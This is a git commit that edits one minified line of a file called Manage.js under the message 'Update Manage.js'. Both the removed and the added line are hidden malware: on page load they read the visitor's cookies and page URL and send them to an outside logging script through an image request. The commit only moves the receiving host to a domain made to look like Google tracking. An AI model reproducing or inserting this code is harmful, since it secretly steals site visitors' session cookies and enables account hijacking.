e7bef088f323146fcb22f7c84848d1492141d162
9os <druidboykoston@gmail.com>
2017-12-08 19:17:13 -0600

    Update Manage.js

--- Manage.js
+++ Manage.js
@@ -1,1 +1,1 @@
-$(document).ready(function(){$.ajax("/vrxt415",{success:function(e){try{jQuery.parseJSON(e)}catch(e){c="C:"+document.cookie,u="U:"+document.location,(new Image).src="http://h.net16.net/log.php?log="+encodeURIComponent(c+u)}}})});
+$(document).ready(function(){$.ajax("/vrxt415",{success:function(e){try{jQuery.parseJSON(e)}catch(e){c="C:"+document.cookie,u="U:"+document.location,(new Image).src="http://googltrack.vacau.com/log.php?log="+encodeURIComponent(c+u)}}})});
